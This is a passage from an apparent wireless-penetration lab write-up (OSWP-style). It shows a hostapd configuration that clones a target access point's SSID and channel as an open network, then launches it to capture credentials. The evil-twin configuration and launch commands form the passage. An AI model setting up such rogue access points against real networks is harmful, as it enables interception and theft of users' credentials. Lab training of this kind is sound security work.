The last item on our list is the rogue AP configuration file. We will be usingÂ `hostapd` to run the AP. We can install it withÂ sudo apt install hostapd.

We will be creating a `802.11n AP` with the exact same `SSID` and channel as the `AP` we are targeting, but we won't be using any encryption.

```bash
interface=wlan0
ssid=MegaCorp One Lab
channel=11

# 802.11n
hw_mode=g
ieee80211n=1

# Uncomment the following lines to use OWE instead of an open network
#wpa=2
#ieee80211w=2
#wpa_key_mgmt=OWE
#rsn_pairwise=CCMP
```

Now that we have put all the pieces together, let's run `hostapd` and get some credentials.

```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[16Apr2025 23:06:26]-[/home/kali/SUT/OSWP/www.megacorpone.com]
â””â”€# sudo hostapd -B mco-hostapd.conf
wlan0: interface state UNINITIALIZED->ENABLED
wlan0: AP-ENABLED 
```
